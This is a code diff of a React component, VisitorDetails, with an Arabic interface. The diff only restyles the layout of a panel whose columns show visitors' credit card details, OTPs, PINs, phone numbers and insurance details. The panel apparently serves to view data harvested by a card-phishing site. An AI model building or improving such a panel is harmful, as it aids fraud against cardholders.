@@ -580,9 +580,9 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             <p>لا توجد بيانات لعرضها</p>
           </div>
         ) : (
-          <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 lg:gap-6" dir="rtl">
+          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 lg:gap-0" dir="rtl">
             {/* Right Column - Credit Card and Card Details */}
-            <div className="flex flex-col gap-2">
+            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:pl-6">
               {sortedBubbles.filter(b => b.id.startsWith("card-info") || b.id === "card-details").map((bubble) => (
             <DataBubble
               key={bubble.id}
@@ -672,7 +672,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             </div>
 
             {/* Middle Column - Dynamic Cards (OTP, PIN, Phone, etc.) */}
-            <div className="flex flex-col gap-2">
+            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:px-6">
               {sortedBubbles.filter(b => 
                 !b.id.startsWith("card-info") && 
                 b.id !== "card-details" &&
@@ -754,7 +754,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             </div>
 
             {/* Left Column - Static Info (Basic, Offer Details, Insurance Details) */}
-            <div className="flex flex-col gap-2">
+            <div className="flex flex-col gap-4 lg:pr-6">
               {sortedBubbles.filter(b => 
                 b.id === "basic-info" || 
                 b.id === "offer-details" ||
